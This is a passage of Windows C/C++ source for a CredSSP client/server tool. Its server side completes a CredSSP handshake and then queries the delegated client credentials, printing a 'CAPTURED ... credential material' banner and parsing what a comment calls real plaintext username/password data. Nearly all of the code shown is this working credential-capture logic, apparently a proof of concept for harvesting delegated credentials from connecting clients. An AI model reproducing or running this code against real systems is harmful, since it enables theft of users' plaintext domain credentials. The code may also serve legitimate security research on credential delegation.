    sc.paCred = &pServerCertCtx;

    CREDSSP_CRED cred = {  };
    cred.Type = CredsspSubmitBufferBoth;
    cred.pSchannelCred = &sc;
    cred.pSpnegoCred = NULL;

    CredHandle hCred;
    TimeStamp ts;

    SECURITY_STATUS st = ft->AcquireCredentialsHandle(NULL, (SEC_WCHAR*)L"CredSSP", SECPKG_CRED_INBOUND, NULL, &cred, NULL, NULL, &hCred, &ts);

 /*   printf("status = 0x%08lx\n", st);
    printf("sizeof(SCHANNEL_CRED) = %zu\n", sizeof(SCHANNEL_CRED));
    printf("sizeof(CREDSSP_CRED) = %zu\n", sizeof(CREDSSP_CRED));
    printf("Type = %lu\n", (unsigned long)cred.Type);
    printf("pSchannelCred = %p\n", (void*)cred.pSchannelCred);*/
    if (FAILED(st)) return 1;

    CtxtHandle ctx; BOOL have = FALSE; DWORD attr = 0;
    char inbuf[MAXTOK]; unsigned int inlen = 0;

    st = SEC_I_CONTINUE_NEEDED;
    while (st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) {
        if (recv_tok(s, inbuf, sizeof inbuf, &inlen)) break;
       
        /*SecBuffer     ib = {inlen, SECBUFFER_TOKEN, inbuf};
        SecBufferDesc iD = { SECBUFFER_VERSION, 1, &ib };
        SecBuffer     ob = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc oD = { SECBUFFER_VERSION, 1, &ob };
        */
        SecBuffer ib[2] = { 0 };

        ib[0].cbBuffer = inlen;
        ib[0].BufferType = SECBUFFER_TOKEN;
        ib[0].pvBuffer = inbuf;

        ib[1].BufferType = SECBUFFER_EMPTY;

        SecBufferDesc iD = {
            SECBUFFER_VERSION,
            2,
            ib
        };

        SecBuffer ob = { 0 };
        ob.BufferType = SECBUFFER_TOKEN;

        SecBufferDesc oD = {
            SECBUFFER_VERSION,
            1,
            &ob
        };

       /* printf("[server] input: %lu bytes\n", inlen);

        for (DWORD i = 0; i < iD.cBuffers; i++) {
            printf("[server]   IN[%lu] type=0x%08lx len=%lu ptr=%p\n",
                i,
                ib[i].BufferType,
                ib[i].cbBuffer,
                ib[i].pvBuffer);
        }
        */

        st = ft->AcceptSecurityContext(&hCred, have ? &ctx : NULL, &iD, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_EXTENDED_ERROR,SECURITY_NATIVE_DREP, &ctx, &oD, &attr, NULL);
        have = TRUE;

      /*  for (DWORD i = 0; i < iD.cBuffers; i++) {
            printf("[server]   IN[%lu] type=0x%08lx len=%lu ptr=%p\n",
                i,
                ib[i].BufferType,
                ib[i].cbBuffer,
                ib[i].pvBuffer);
        }

        printf("[server]   OUT[0] type=0x%08lx len=%lu ptr=%p\n",
            ob.BufferType,
            ob.cbBuffer,
            ob.pvBuffer);
   
        printf("[server] ASC -> 0x%08lx\n", st);*/

        if ((st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) && ob.cbBuffer && ob.pvBuffer) {
            send_tok(s, ob.pvBuffer, ob.cbBuffer);
            ft->FreeContextBuffer(ob.pvBuffer);
        }
        if (FAILED(st)) { printf("[server] ASC failed\n"); break; }
    }

    if (st == SEC_E_OK) {
        printf("[server] context established -- pulling delegated credentials...\n");
        SecPkgContext_ClientCreds creds = { 0 };
        SECURITY_STATUS q = ft->QueryContextAttributesW(&ctx, SECPKG_ATTR_CREDS_2, &creds);
        printf("[server] QueryContextAttributes(SECPKG_ATTR_CREDS) = 0x%08lx\n", q);
        if (q == SEC_E_OK) {
            printf("[server] >>> CAPTURED %lu bytes of delegated credential material <<<\n",
                creds.AuthBufferLen);
           // std::cout << std::hex << &creds.AuthBuffer << std::endl;
            
            /* AuthBuffer holds packed username/password (or KERB_INTERACTIVE_LOGON w/ _2).
               Print/parse carefully -- this is real plaintext credential material. */

            ParseAndPrintClientCreds(&creds);
        }
    }

    ft->FreeCredentialsHandle(&hCred);
    closesocket(s);
    return 0;
}

int main(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr,
            "usage:\n"
            "  %s server <bind_ip> <port>\n"
            "  %s client <host> <port> <SPN> [fresh]\n", argv[0], argv[0]);
        return 2;
    }
    WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
    int rc;
    if (!strcmp(argv[1], "server")) {
        rc = run_server(argc > 2 ? argv[2] : "0.0.0.0", argc > 3 ? argv[3] : "5555");
    }
    else {
        const char* host = argc > 2 ? argv[2] : "127.0.0.1";
        const char* port = argc > 3 ? argv[3] : "5555";
        const char* spn = argc > 4 ? argv[4] : "HOST/localhost";
        int fresh = (argc > 5 && !strcmp(argv[5], "fresh"));
        rc = run_client(host, port, spn, fresh);
    }
    WSACleanup();
    return rc;
}
